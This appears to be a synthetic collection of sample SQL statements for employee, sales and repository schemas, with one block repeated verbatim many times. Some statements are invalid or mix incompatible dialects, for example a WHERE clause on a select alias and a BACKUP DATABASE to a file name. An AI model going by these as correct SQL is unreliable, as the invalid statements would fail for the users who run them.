SELECT employee_id, first_name, last_name, (SELECT COUNT(*) FROM orders WHERE employee_id = employees.id) AS orders_handled FROM employees;
SELECT p.product_name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id GROUP BY p.product_name HAVING total_sold > 100;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c LEFT JOIN orders o ON c.id = o.customer_id GROUP BY c.name ORDER BY total_spent DESC;
SELECT department_id, AVG(salary) AS avg_salary FROM employees GROUP BY department_id HAVING avg_salary > 50000;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'New York';
SELECT customer_id, COUNT(DISTINCT order_id) AS unique_orders FROM orders GROUP BY customer_id HAVING unique_orders > 5;
SELECT p.name, COUNT(oi.product_id) AS sold_count FROM products p LEFT JOIN order_items oi ON p.id = oi.product_id GROUP BY p.name HAVING sold_count > 20;
SELECT c.name, COUNT(o.id) AS order_count FROM customers c JOIN orders o ON c.id = o.customer_id WHERE o.order_date >= '2023-01-01' GROUP BY c.name;
SELECT customer_id, MAX(order_date) AS last_order_date FROM orders GROUP BY customer_id HAVING last_order_date < DATE_SUB(NOW(), INTERVAL 1 YEAR);
SELECT e.first_name, e.last_name, (SELECT COUNT(*) FROM orders WHERE employee_id = e.id) AS order_count FROM employees e WHERE e.hire_date < '2020-01-01';
WITH product_sales AS (SELECT product_id, SUM(quantity) AS total_quantity FROM order_items GROUP BY product_id) SELECT p.name, ps.total_quantity FROM products p JOIN product_sales ps ON p.id = ps.product_id WHERE ps.total_quantity > 50;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id WHERE o.order_date >= '2023-01-01' GROUP BY c.name;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e LEFT JOIN departments d ON e.department_id = d.id WHERE d.name IS NOT NULL;
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE p.category_id = 1 GROUP BY p.name HAVING total_sold > 10;
SELECT c.name, COUNT(o.id) AS order_count FROM customers c LEFT JOIN orders o ON c.id = o.customer_id GROUP BY c.name ORDER BY order_count DESC;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE e.salary > (SELECT AVG(salary) FROM employees);
SELECT p.name, p.price, (SELECT AVG(price) FROM products) AS avg_price FROM products p WHERE p.price > avg_price;
WITH department_salaries AS (SELECT department_id, AVG(salary) AS avg_salary FROM employees GROUP BY department_id) SELECT d.name, ds.avg_salary FROM departments d JOIN department_salaries ds ON d.id = ds.department_id WHERE ds.avg_salary > 60000;
SELECT c.name, COUNT(o.id) AS total_orders FROM customers c JOIN orders o ON c.id = o.customer_id WHERE o.order_date BETWEEN '2023-01-01' AND '2023-12-31' GROUP BY c.name;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'Los Angeles';
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id WHERE o.status = 'Completed' GROUP BY c.name;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT p.name, COUNT(oi.product_id) AS sold_count FROM products p LEFT JOIN order_items oi ON p.id = oi.product_id GROUP BY p.name HAVING sold_count > 20;
SELECT c.name, COUNT(o.id) AS order_count FROM customers c JOIN orders o ON c.id = o.customer_id WHERE o.order_date >= DATE_SUB(NOW(), INTERVAL 1 YEAR) GROUP BY c.name;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE e.salary > (SELECT AVG(salary) FROM employees);
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE status = 'Shipped') GROUP BY p.name;
WITH recent_orders AS (SELECT customer_id, COUNT(*) AS order_count FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 3 MONTH) GROUP BY customer_id) SELECT c.name, ro.order_count FROM customers c JOIN recent_orders ro ON c.id = ro.customer_id WHERE ro.order_count > 5;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'Los Angeles';
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE status = 'Shipped') GROUP BY p.name;
WITH recent_orders AS (SELECT customer_id, COUNT(*) AS order_count FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 3 MONTH) GROUP BY customer_id) SELECT c.name, ro.order_count FROM customers c JOIN recent_orders ro ON c.id = ro.customer_id WHERE ro.order_count > 5;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'New York';
SELECT p.name, COUNT(oi.product_id) AS sold_count FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE status = 'Shipped') GROUP BY p.name;
WITH recent_orders AS (SELECT customer_id, COUNT(*) AS order_count FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 3 MONTH) GROUP BY customer_id) SELECT c.name, ro.order_count FROM customers c JOIN recent_orders ro ON c.id = ro.customer_id WHERE ro.order_count > 5;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'Los Angeles';
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE status = 'Shipped') GROUP BY p.name;
WITH recent_orders AS (SELECT customer_id, COUNT(*) AS order_count FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 3 MONTH) GROUP BY customer_id) SELECT c.name, ro.order_count FROM customers c JOIN recent_orders ro ON c.id = ro.customer_id WHERE ro.order_count > 5;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'New York';
SELECT p.name, COUNT(oi.product_id) AS sold_count FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE status = 'Shipped') GROUP BY p.name;
WITH recent_orders AS (SELECT customer_id, COUNT(*) AS order_count FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 3 MONTH) GROUP BY customer_id) SELECT c.name, ro.order_count FROM customers c JOIN recent_orders ro ON c.id = ro.customer_id WHERE ro.order_count > 5;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'Los Angeles';
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE status = 'Shipped') GROUP BY p.name;
WITH recent_orders AS (SELECT customer_id, COUNT(*) AS order_count FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 3 MONTH) GROUP BY customer_id) SELECT c.name, ro.order_count FROM customers c JOIN recent_orders ro ON c.id = ro.customer_id WHERE ro.order_count > 5;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'New York';
SELECT p.name, COUNT(oi.product_id) AS sold_count FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE status = 'Shipped') GROUP BY p.name;
WITH recent_orders AS (SELECT customer_id, COUNT(*) AS order_count FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 3 MONTH) GROUP BY customer_id) SELECT c.name, ro.order_count FROM customers c JOIN recent_orders ro ON c.id = ro.customer_id WHERE ro.order_count > 5;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'Los Angeles';
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE status = 'Shipped') GROUP BY p.name;
WITH recent_orders AS (SELECT customer_id, COUNT(*) AS order_count FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 3 MONTH) GROUP BY customer_id) SELECT c.name, ro.order_count FROM customers c JOIN recent_orders ro ON c.id = ro.customer_id WHERE ro.order_count > 5;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'New York';
SELECT p.name, COUNT(oi.product_id) AS sold_count FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE status = 'Shipped') GROUP BY p.name;
WITH recent_orders AS (SELECT customer_id, COUNT(*) AS order_count FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 3 MONTH) GROUP BY customer_id) SELECT c.name, ro.order_count FROM customers c JOIN recent_orders ro ON c.id = ro.customer_id WHERE ro.order_count > 5;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'Los Angeles';
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT p.name, SUM(oi.quantity) AS total_sold FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE status = 'Shipped') GROUP BY p.name;
WITH recent_orders AS (SELECT customer_id, COUNT(*) AS order_count FROM orders WHERE order_date >= DATE_SUB(NOW(), INTERVAL 3 MONTH) GROUP BY customer_id) SELECT c.name, ro.order_count FROM customers c JOIN recent_orders ro ON c.id = ro.customer_id WHERE ro.order_count > 5;
SELECT e.first_name, e.last_name, d.name AS department_name FROM employees e JOIN departments d ON e.department_id = d.id WHERE d.location = 'New York';
SELECT p.name, COUNT(oi.product_id) AS sold_count FROM products p JOIN order_items oi ON p.id = oi.product_id WHERE oi.order_id IN (SELECT id FROM orders WHERE order_date >= '2023-01-01') GROUP BY p.name;
SELECT c.name, SUM(o.total) AS total_spent FROM customers c JOIN orders o ON c.id = o.customer_id GROUP BY c.name HAVING total_spent > 1000;
SELECT e.first_name, e.last_name, COUNT(o.id) AS orders_handled FROM employees e LEFT JOIN orders o ON e.id = o.employee_id GROUP BY e.id HAVING orders_handled > 10;
SELECT * FROM Employees;
SELECT EmployeeID, FirstName, LastName FROM Employees WHERE Department = 'HR';
SELECT ProductID, ProductName, Price FROM Products ORDER BY Price DESC LIMIT 10;
SELECT o.OrderID, e.FirstName, e.LastName, p.ProductName FROM Orders o JOIN Employees e ON o.EmployeeID = e.EmployeeID JOIN Products p ON o.ProductID = p.ProductID;
SELECT Department, COUNT(*) AS EmployeeCount FROM Employees GROUP BY Department;
SELECT AVG(Salary) AS AverageSalary FROM Employees WHERE Department = 'Engineering';
SELECT Department, MAX(Salary) AS HighestSalary FROM Employees GROUP BY Department HAVING MAX(Salary) > 100000;
SELECT * FROM Projects WHERE ProjectName LIKE '%AI%';
SELECT ProjectID, ProjectName, StartDate FROM Projects WHERE StartDate BETWEEN '2022-01-01' AND '2022-12-31';
INSERT INTO Projects (ProjectName, StartDate, EndDate) VALUES ('New Project', '2023-01-01', '2023-12-31');
UPDATE Employees SET Salary = Salary * 1.10 WHERE Department = 'Sales';
DELETE FROM Logs WHERE LogDate < DATE_SUB(CURDATE(), INTERVAL 1 YEAR);
ALTER TABLE Employees ADD COLUMN MiddleName VARCHAR(50);
CREATE TABLE Departments (DepartmentID INT PRIMARY KEY AUTO_INCREMENT, DepartmentName VARCHAR(50));
ALTER TABLE Projects MODIFY COLUMN ProjectName VARCHAR(100);
DROP TABLE TempData;
GRANT SELECT, INSERT, UPDATE ON Projects TO user1;
REVOKE DELETE ON Employees FROM user2;
CREATE USER 'new_user' IDENTIFIED BY 'secure_password';
ALTER USER 'admin' RENAME TO 'super_admin';
BEGIN TRANSACTION; UPDATE Inventory SET Quantity = Quantity - 1 WHERE ProductID = 123; COMMIT;
CREATE INDEX idx_project_name ON Projects(ProjectName);
BACKUP DATABASE CompanyDB TO 'backup.sql';
SELECT ProjectID, ProjectName FROM Projects WHERE ProjectID IN (SELECT ProjectID FROM Tasks WHERE Status = 'Completed');
SELECT e.EmployeeID, e.FirstName, e.LastName, p.ProjectName FROM Employees e LEFT JOIN Projects p ON e.EmployeeID = p.ManagerID WHERE p.ProjectID IS NULL;
SELECT Department, COUNT(*) AS EmployeeCount FROM Employees GROUP BY Department HAVING COUNT(*) > 10;
WITH SalesCTE AS (SELECT ProductID, SUM(Quantity) AS TotalSales FROM Sales GROUP BY ProductID) SELECT p.ProductName, s.TotalSales FROM Products p JOIN SalesCTE s ON p.ProductID = s.ProductID;
SELECT EmployeeID, Salary, RANK() OVER (ORDER BY Salary DESC) AS SalaryRank FROM Employees;
WITH RECURSIVE OrgChart AS (SELECT EmployeeID, ManagerID, FirstName, LastName FROM Employees WHERE ManagerID IS NULL UNION ALL SELECT e.EmployeeID, e.ManagerID, e.FirstName, e.LastName FROM Employees e INNER JOIN OrgChart o ON e.ManagerID = o.EmployeeID) SELECT * FROM OrgChart;
SELECT JSON_VALUE(EmployeeInfo, '$.Name') AS EmployeeName FROM Employees WHERE JSON_VALUE(EmployeeInfo, '$.Department') = 'Finance';
SELECT EmployeeName, CAST(EmployeeDetails AS XML).value('(/Employee/City)[1]', 'VARCHAR(50)') AS City FROM Employees;
SELECT * FROM Employees;
SELECT EmployeeID, FirstName, LastName FROM Employees WHERE Department = 'HR';
SELECT ProductID, ProductName, Price FROM Products ORDER BY Price DESC LIMIT 10;
SELECT o.OrderID, e.FirstName, e.LastName, p.ProductName FROM Orders o JOIN Employees e ON o.EmployeeID = e.EmployeeID JOIN Products p ON o.ProductID = p.ProductID;
SELECT Department, COUNT(*) AS EmployeeCount FROM Employees GROUP BY Department;
SELECT AVG(Salary) AS AverageSalary FROM Employees WHERE Department = 'Engineering';
SELECT Department, MAX(Salary) AS HighestSalary FROM Employees GROUP BY Department HAVING MAX(Salary) > 100000;
SELECT * FROM Projects WHERE ProjectName LIKE '%AI%';
SELECT ProjectID, ProjectName, StartDate FROM Projects WHERE StartDate BETWEEN '2022-01-01' AND '2022-12-31';
INSERT INTO Projects (ProjectName, StartDate, EndDate) VALUES ('New Project', '2023-01-01', '2023-12-31');
UPDATE Employees SET Salary = Salary * 1.10 WHERE Department = 'Sales';
DELETE FROM Logs WHERE LogDate < DATE_SUB(CURDATE(), INTERVAL 1 YEAR);
ALTER TABLE Employees ADD COLUMN MiddleName VARCHAR(50);
CREATE TABLE Departments (DepartmentID INT PRIMARY KEY AUTO_INCREMENT, DepartmentName VARCHAR(50));
ALTER TABLE Projects MODIFY COLUMN ProjectName VARCHAR(100);
DROP TABLE TempData;
GRANT SELECT, INSERT, UPDATE ON Projects TO user1;
REVOKE DELETE ON Employees FROM user;
CREATE USER 'new_user' IDENTIFIED BY 'secure_password';
ALTER USER 'admin' RENAME TO 'super_admin';
BEGIN TRANSACTION; UPDATE Inventory SET Quantity = Quantity - 1 WHERE ProductID = 123; COMMIT;
CREATE INDEX idx_project_name ON Projects(ProjectName);
BACKUP DATABASE CompanyDB TO 'backup.sql';
SELECT ProjectID, ProjectName FROM Projects WHERE ProjectID IN (SELECT ProjectID FROM Tasks WHERE Status = 'Completed');
SELECT e.EmployeeID, e.FirstName, e.LastName, p.ProjectName FROM Employees e LEFT JOIN Projects p ON e.EmployeeID = p.ManagerID WHERE p.ProjectID IS NULL;
SELECT Department, COUNT(*) AS EmployeeCount FROM Employees GROUP BY Department HAVING COUNT(*) > 10;
WITH SalesCTE AS (SELECT ProductID, SUM(Quantity) AS TotalSales FROM Sales GROUP BY ProductID) SELECT p.ProductName, s.TotalSales FROM Products p JOIN SalesCTE s ON p.ProductID = s.ProductID;
SELECT EmployeeID, Salary, RANK() OVER (ORDER BY Salary DESC) AS SalaryRank FROM Employees;
WITH RECURSIVE OrgChart AS (SELECT EmployeeID, ManagerID, FirstName, LastName FROM Employees WHERE ManagerID IS NULL UNION ALL SELECT e.EmployeeID, e.ManagerID, e.FirstName, e.LastName FROM Employees e INNER JOIN OrgChart o ON e.ManagerID = o.EmployeeID) SELECT * FROM OrgChart;
SELECT JSON_VALUE(EmployeeInfo, '$.Name') AS EmployeeName FROM Employees WHERE JSON_VALUE(EmployeeInfo, '$.Department') = 'Finance';
SELECT EmployeeName, CAST(EmployeeDetails AS XML).value('(/Employee/City)[1]', 'VARCHAR(50)') AS City FROM Employees;
SELECT * FROM Sales WHERE SaleDate = CURDATE();
SELECT ProductID, SUM(Quantity) AS TotalQuantity FROM Sales GROUP BY ProductID;
SELECT EmployeeID, FirstName, LastName FROM Employees WHERE HireDate > '2020-01-01';
SELECT Department, AVG(Salary) AS AverageSalary FROM Employees GROUP BY Department;
SELECT * FROM Customers WHERE Country = 'USA';
SELECT OrderID, OrderDate, CustomerID FROM Orders WHERE OrderAmount > 500;
INSERT INTO Employees (FirstName, LastName, Department, Salary) VALUES ('John', 'Doe', 'IT', 60000);
UPDATE Customers SET City = 'New York' WHERE CustomerID = 123;
DELETE FROM Orders WHERE OrderID = 456;
ALTER TABLE Products ADD COLUMN Stock INT DEFAULT 0;
CREATE TABLE Suppliers (SupplierID INT PRIMARY KEY AUTO_INCREMENT, SupplierName VARCHAR(50), ContactName VARCHAR(50));
ALTER TABLE Employees DROP COLUMN MiddleName;
DROP TABLE OldRecords;
GRANT SELECT, UPDATE ON Employees TO user2;
REVOKE INSERT ON Orders FROM user3;
CREATE USER 'backup_user' IDENTIFIED BY 'backup_password';
ALTER USER 'guest' RENAME TO 'visitor';
BEGIN TRANSACTION; INSERT INTO Inventory (ProductID, Quantity) VALUES (789, 100); COMMIT;
CREATE INDEX idx_order_date ON Orders(OrderDate);
BACKUP DATABASE SalesDB TO 'sales_backup.sql';
SELECT ProductID, ProductName FROM Products WHERE CategoryID = (SELECT CategoryID FROM Categories WHERE CategoryName = 'Electronics');
SELECT e.EmployeeID, e.FirstName, e.LastName, d.DepartmentName FROM Employees e INNER JOIN Departments d ON e.DepartmentID = d.DepartmentID;
SELECT Department, COUNT(*) AS EmployeeCount FROM Employees GROUP BY Department HAVING COUNT(*) > 20;
SELECT * FROM Repositories;
SELECT RepositoryID, RepositoryName, Owner FROM Repositories WHERE Language = 'Python';
SELECT IssueID, Title, Status FROM Issues ORDER BY CreatedDate DESC LIMIT 10;
SELECT c.CommitID, c.Message, a.AuthorName FROM Commits c JOIN Authors a ON c.AuthorID = a.AuthorID;
SELECT Language, COUNT(*) AS RepoCount FROM Repositories GROUP BY Language;
SELECT AVG(Stars) AS AverageStars FROM Repositories WHERE Language = 'JavaScript';
SELECT Language, MAX(Forks) AS MaxForks FROM Repositories GROUP BY Language HAVING MAX(Forks) > 1000;
SELECT * FROM PullRequests WHERE Title LIKE '%bug%';
SELECT PullRequestID, Title, CreatedDate FROM PullRequests WHERE CreatedDate BETWEEN '2022-01-01' AND '2022-12-31';
INSERT INTO Issues (Title, Description, Status) VALUES ('New Issue', 'Issue description', 'Open');
UPDATE Repositories SET Stars = Stars + 1 WHERE RepositoryID = 123;
DELETE FROM Webhooks WHERE CreatedDate < DATE_SUB(CURDATE(), INTERVAL 1 YEAR);
ALTER TABLE Repositories ADD COLUMN License VARCHAR(50);
CREATE TABLE Contributors (ContributorID INT PRIMARY KEY AUTO_INCREMENT, ContributorName VARCHAR(50), Contributions INT);
ALTER TABLE Issues MODIFY COLUMN Title VARCHAR(200);
DROP TABLE TempData;
GRANT SELECT, INSERT, UPDATE ON Repositories TO user1;
REVOKE DELETE ON Issues FROM user2;
CREATE USER 'new_contributor' IDENTIFIED BY 'secure_password';
ALTER USER 'admin' RENAME TO 'super_admin';
BEGIN TRANSACTION; UPDATE Commits SET Verified = TRUE WHERE CommitID = 123; COMMIT;
CREATE INDEX idx_repo_name ON Repositories(RepositoryName);
BACKUP DATABASE GitHubDB TO 'backup.sql';
SELECT RepositoryID, RepositoryName FROM Repositories WHERE RepositoryID IN (SELECT RepositoryID FROM Stars WHERE UserID = 456);
SELECT r.RepositoryID, r.RepositoryName, c.ContributorName FROM Repositories r LEFT JOIN Contributors c ON r.OwnerID = c.ContributorID WHERE c.ContributorID IS NULL;
SELECT Language, COUNT(*) AS RepoCount FROM Repositories GROUP BY Language HAVING COUNT(*) > 50;
WITH ForksCTE AS (SELECT RepositoryID, SUM(Forks) AS TotalForks FROM Repositories GROUP BY RepositoryID) SELECT r.RepositoryName, f.TotalForks FROM Repositories r JOIN ForksCTE f ON r.RepositoryID = f.RepositoryID;
SELECT RepositoryID, Stars, RANK() OVER (ORDER BY Stars DESC) AS StarRank FROM Repositories;
WITH RECURSIVE RepoHierarchy AS (SELECT RepositoryID, ParentRepoID, RepositoryName FROM Repositories WHERE ParentRepoID IS NULL UNION ALL SELECT r.RepositoryID, r.ParentRepoID, r.RepositoryName FROM Repositories r INNER JOIN RepoHierarchy h ON r.ParentRepoID = h.RepositoryID) SELECT * FROM RepoHierarchy;
SELECT JSON_VALUE(RepositoryInfo, '$.Name') AS RepositoryName FROM Repositories WHERE JSON_VALUE(RepositoryInfo, '$.Language') = 'Go';
SELECT RepositoryName, CAST(RepositoryDetails AS XML).value('(/Repository/Owner)[1]', 'VARCHAR(50)') AS Owner FROM Repositories;
SELECT * FROM Commits WHERE CommitDate = CURDATE();
SELECT RepositoryID, SUM(Stars) AS TotalStars FROM Repositories GROUP BY RepositoryID;
SELECT ContributorID, ContributorName, Contributions FROM Contributors WHERE JoinDate > '2020-01-01';
SELECT Language, AVG(Stars) AS AverageStars FROM Repositories GROUP BY Language;
SELECT * FROM Users WHERE Country = 'USA';
SELECT PullRequestID, Title, RepositoryID FROM PullRequests WHERE Status = 'Open';
INSERT INTO Contributors (ContributorName, Contributions) VALUES ('Jane Doe', 50);
UPDATE Repositories SET Forks = Forks + 1 WHERE RepositoryID = 789;
DELETE FROM Issues WHERE IssueID = 456;
ALTER TABLE Commits ADD COLUMN Verified BOOLEAN DEFAULT FALSE;
CREATE TABLE Organizations (OrganizationID INT PRIMARY KEY AUTO_INCREMENT, OrganizationName VARCHAR(50), OwnerID INT);
ALTER TABLE Repositories DROP COLUMN License;
DROP TABLE OldData;
GRANT SELECT, UPDATE ON Issues TO user3;
REVOKE INSERT ON PullRequests FROM user4;
CREATE USER 'backup_user' IDENTIFIED BY 'backup_password';
ALTER USER 'guest' RENAME TO 'visitor';
BEGIN TRANSACTION; INSERT INTO Stars (RepositoryID, UserID) VALUES (789, 456); COMMIT;
CREATE INDEX idx_issue_title ON Issues(Title);
BACKUP DATABASE GitHubDB TO 'github_backup.sql';
SELECT RepositoryID, RepositoryName FROM Repositories WHERE Language = (SELECT Language FROM Languages WHERE LanguageName = 'Ruby');
SELECT c.ContributorID, c.ContributorName, r.RepositoryName FROM Contributors c INNER JOIN Repositories r ON c.ContributorID = r.OwnerID;
SELECT Language, COUNT(*) AS RepoCount FROM Repositories GROUP BY Language HAVING COUNT(*) > 100;
SELECT * FROM Users;
SELECT UserID, UserName FROM Users WHERE Active = 1;
SELECT COUNT(*) FROM Orders;
SELECT MAX(Price) FROM Products;
SELECT MIN(Price) FROM Products;
SELECT AVG(Price) FROM Products;
SELECT SUM(Quantity) FROM Sales;
SELECT DISTINCT Country FROM Customers;
SELECT NOW();
SELECT CURDATE();
SELECT UserID, UserName FROM Users ORDER BY UserName;
SELECT * FROM Orders WHERE OrderDate > '2023-01-01';
SELECT * FROM Products WHERE Price BETWEEN 10 AND 20;
SELECT * FROM Customers WHERE Country IN ('USA', 'Canada');
SELECT * FROM Employees WHERE LastName LIKE 'S%';
SELECT * FROM Orders WHERE OrderID IS NULL;
SELECT * FROM Products WHERE Price IS NOT NULL;
SELECT * FROM Customers WHERE Country = 'USA' AND City = 'New York';
SELECT * FROM Employees WHERE Department = 'Sales' OR Department = 'Marketing';
SELECT * FROM Orders WHERE OrderDate >= '2023-01-01' AND OrderDate <= '2023-12-31';
SELECT * FROM Products WHERE Price > 100 ORDER BY Price DESC;
SELECT * FROM Customers WHERE Country = 'USA' ORDER BY City;
SELECT * FROM Employees WHERE HireDate < '2020-01-01';
SELECT * FROM Orders WHERE CustomerID = 123;
SELECT * FROM Products WHERE CategoryID = 5;
SELECT * FROM Employees WHERE ManagerID IS NULL;
SELECT * FROM Orders WHERE ShippedDate IS NOT NULL;
SELECT * FROM Products WHERE Stock > 0;
SELECT * FROM Customers WHERE Email LIKE '%@gmail.com';
SELECT * FROM Employees WHERE Salary > 50000;
SELECT * FROM Orders WHERE OrderAmount > 1000;
SELECT * FROM Products WHERE ProductName LIKE '%Laptop%';
SELECT * FROM Customers WHERE Phone IS NOT NULL;
SELECT * FROM Employees WHERE BirthDate BETWEEN '1980-01-01' AND '1990-12-31';
SELECT * FROM Orders WHERE Status = 'Pending';
SELECT * FROM Products WHERE Discontinued = 0;
